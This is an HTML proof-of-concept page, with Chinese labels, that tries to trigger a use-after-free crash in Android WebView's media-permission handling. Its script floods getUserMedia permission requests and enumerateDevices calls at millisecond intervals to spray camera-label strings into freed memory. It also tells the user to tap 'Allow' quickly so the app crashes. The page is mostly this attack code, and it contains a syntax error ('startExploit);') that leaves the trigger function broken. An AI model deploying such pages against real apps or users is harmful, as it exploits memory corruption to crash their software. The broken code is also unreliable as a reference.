<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WebView UAF 稳定性压测 (手动版)</title>
    <style>
        body { font-family: -apple-system, sans-serif; text-align: center; padding: 40px 20px; background: #fafafa; color: #333; }
        .card { max-width: 500px; margin: 0 auto; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 16px rgba(0,0,0,0.08); }
        .btn { padding: 16px 32px; font-size: 18px; font-weight: bold; color: white; background: #007aff; border: none; border-radius: 8px; cursor: pointer; transition: background 0.2s; width: 100%; }
        .btn:hover { background: #0056b3; }
        .steps { text-align: left; margin-top: 25px; background: #f5f5f7; padding: 15px; border-radius: 8px; font-size: 14px; line-height: 1.6; }
        .warning { color: #ff3b30; font-weight: bold; }
    </style>
</head>
<body>

    <div class="card">
        <h2>🛸 WebView 内存漏洞对撞机</h2>
        <p>本测试专门用于在不修改客户端代码的情况下复现 UAF 闪退</p>
        
        <button class="btn" onclick="triggerManualAttack()">1. 点击开始测试</button>
        
        <div class="steps">
            <strong>🎯 完美复现操作指南：</strong><br>
            1. 点击上方蓝色按钮。<br>
            2. 屏幕上会弹出 WebView 原生的“允许拍摄视频和录制音频”弹窗。<br>
            3. <span class="warning">关键点：请用你最快的单身手速，立刻点击“允许”或“仅在使用中允许”。</span><br>
            4. 观察 App 是否在点击的瞬间轰然闪退。
        </div>
    </div>

    <script>
        // 核心逻辑：左手高频申请权限（制造 Free），右手高频刷新设备（制造相机字符串填坑）
        function startExploit() {
            console.log("🔥 漏洞复现点火...");
        
            // 1. 疯狂弹窗并自动拒绝/接受，制造 AwPermissionRequest 的高频创建与销毁
            setInterval(() => {
                navigator.mediaDevices.getUserMedia({ video: true, audio: true })
                    .then(stream => stream.getTracks().forEach(t => t.stop()))
                    .catch(err => {}); // 触发权限弹窗
            }, 5);
        
            // 2. 【关键】疯狂轰炸多媒体硬件层，逼底层不断生成 "camera2 1, facing front" 填补内存空洞
            setInterval(() => {
                navigator.mediaDevices.enumerateDevices()
                    .then(devices => {
                        // 纯粹为了消耗和刷新内存，让相机标签字符串在堆上疯狂刷屏
                        let dummy = devices.map(d => d.label).join(","); 
                    });
            }, 2);
        }
    
        function triggerManualAttack() {
             startExploit);
        }
    </script>
</body>
</html>
